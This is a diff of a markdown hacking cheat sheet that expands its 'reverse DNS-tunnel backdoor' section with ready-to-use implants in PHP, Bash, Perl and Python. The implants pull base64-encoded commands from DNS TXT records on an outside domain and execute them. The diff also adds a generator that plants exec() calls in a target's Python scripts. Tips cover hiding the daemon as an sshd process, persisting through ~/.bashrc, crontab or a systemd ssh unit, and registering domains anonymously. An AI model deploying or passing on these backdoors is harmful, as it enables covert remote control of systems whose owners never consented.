@@ -1880,6 +1880,8 @@ curl http://127.0.0.1:8080/x.php -d0='' -d1='echo file_get_contents("/etc/hosts"
 <a id="reverse-dns-backdoor"></a>
 **6.vi. Smallest reverse DNS-tunnel Backdoor**
 
+...in PHP:
+---
 Execute arbitrary commands on a server that is _not_ accessible from the public Internet by using a reverse DNS trigger.
 
 Add this line (the implant) at the beginning of any PHP file:
@@ -1896,23 +1898,24 @@ echo -n '@system("{ id; date;}>/tmp/.b00m 2>/dev/null");' |base64 -w0
 - The implant is a `bootloader`. Use a while loop to download and execute larger paypload via DNS.
 - Check out our favorite places to [register a domain anonymously](#pub). [Cloudflare's](https://www.cloudflare.com) Free-Tier is a good start.
 
-Can also be triggered via `~/.bashrc` or the user's crontab. Use (example):
+...in BASH:
+---
+Add this implant to the target's `~/.bashrc` or the crontab (demo-paypload):
 ```shell
-# Use a "double bash" to redirect _also_ $()-subshell error to /dev/null:
+# Use a "double bash" to redirect _also_ errors from $()-subshell to /dev/null:
 bash -c 'exec bash -c "{ $(dig +short b00m2.team-teso.net TXT|tr -d \ \"|base64 -d);}"'&>/dev/null
 ```
 
-An elaborate DNS reverse backdoor (as a daemon and living-off-the-land):
+or change the demo-payload for an elaborate payload:
+- Starts a background daemon to poll every hour for command execution.
 - Depends on bash, dig and base64 only.
 - Hides as `sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups`
-- Requests a DNS TXT record every 60 minutes (from b00m2.team-teso.net).
-- Base64-decodes the TXT record and executes the command on the target. (the test command creates /tmp/.b00m).
+- Example uses `b00m2.team-teso.net` again and creates /tmp/.b00m every hour.
 
-1. Generate a 1-line implant:
-
+Cut & Paste the following into the target's shell to generate the 1-line implant:
 ```shell
 # If dig does not exists then replace /dig +short.../ with
-# /nslookup -q=txt '"$D"'|grep -Fm1 "text ="|sed -E "s|.*text = (.*)|\1|g;s|[\" ]||g"|base64 -d
+# /nslookup -q=txt '"$D"'|grep -Fm1 "text ="|sed -E "s|.*text = (.*)|\1|g;s|[\" ]||g"|base64 -d|bash/
 # or use the Perl example below.
 base64 -w0 >x.txt <<-'EOF'
 D=b00m2.team-teso.net
@@ -1927,16 +1930,11 @@ while :; do
 	slp 3600
 done'|exec -a "$P" bash &) &>/dev/null
 EOF
-echo "===> Execute the following on the target:"$'\n\033[0;36m'"echo $(<x.txt)|base64 -d|bash"$'\033[0m'
+echo "===> Add the following to the target's ~/.bashrc or cronjob:"$'\n\033[0;36m'"echo $(<x.txt)|base64 -d|bash"$'\033[0m'
 rm -f x.txt
 ```
 
-Cut & paste the 1-line implant into the target:
-```shell
-echo RD1iMDBtMi50ZWFtLXRlc28ubmV0ClA9InNzaGQ6IC91c3Ivc2Jpbi9zc2hkIC1EIFtsaXN0ZW5lcl0gMCBvZiAxMC0xMDAgc3RhcnR1cHMiCk09L2Rldi9zaG0vLmNhY2hlJHtVSUR9ClsgLWYgJE0gXSYmZXhpdAp0b3VjaCAkTQooZWNobyAnc2xwKCl7IGxvY2FsIElGUztbIC1uICIke19zZmQ6LX0iIF18fGV4ZWMge19zZmR9PD4gPCg6KTtyZWFkIC10JDEgLXUkX3NmZHx8Ojt9CnNscCAxCndoaWxlIDo7IGRvCmRpZyArc2hvcnQgJyIkRCInIFRYVHx0ciAtZCBcIFwifGJhc2U2NCAtZHxiYXNoCnNscCAzNjAwCmRvbmUnfGV4ZWMgLWEgIiRQIiBiYXNoICYpICY+L2Rldi9udWxsCg==|base64 -d|bash
-```
-
-2. Add the 1-line implant to any startup script on the target (use crontab, ~/.bashrc, [udev](https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp) or `ExecStartPre=`). Here is a clever example for */usr/lib/systemd/system/ssh.service* (with some additional obfuscation):
+Add the 1-line result of the script to any startup script on the target (use crontab, ~/.bashrc, [udev](https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp) or `ExecStartPre=`). Here is a clever example for */usr/lib/systemd/system/ssh.service* (with some additional obfuscation):
 ```
 ...
 [Service]
@@ -1948,6 +1946,8 @@ ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
 ...
 ```
 
+...in PERL:
+---
 The same but only needing perl + bash (not dig):
 ```shell
 perl -MMIME::Base64 -e '$/=undef;print encode_base64(<>,"")' >x.txt <<-'EOF'
@@ -1960,6 +1960,34 @@ echo "===> Execute the following on the target:"$'\n\033[0;36m'"perl -MMIME::Bas
 rm -f x.txt
 ```
 (thank you to LouCipher for a perl verison)
+
+...in PYTHON:
+---
+Cut & paste the following into your shell:
+```shell
+pydnsbackdoorgen() {
+    local str
+    echo -e "This is the TXT record for ${1:?}\e[0;33m"
+    base64 -w0 <"${2:?}"
+    str="$(echo -en 'import dns.resolver\nexec(base64.b64decode("".join([d.to_text() for d in dns.resolver.resolve("'"${1:?}"'", "TXT").rrset])))' | base64 -w 0)"
+    echo -e "\e[0m\nThis is your implant string (add this to the target's python script):\e[0;32m"
+    echo "exec('"'try:\n\timport base64\n\texec(base64.b64decode("'"${str}"'"))\nexcept:\n\tpass'"')"
+    echo -e "\e[0m"
+}
+```
+
+Generate your payload:
+```
+cat >egg.py<<-'EOF'
+import time
+dns.resolver.resolve(f"{int(time.time())}.vgnigskswpbmnhbkyoalc9ufgwru330sj.oast.fun")
+EOF
+```
+
+Generate your implant:
+```
+pydnsbackdoorgen b00mpy.team-teso.net egg.py
+```
    
 <a id="ld-backdoor"></a>
 **6.vii. Local Root Backdoor**
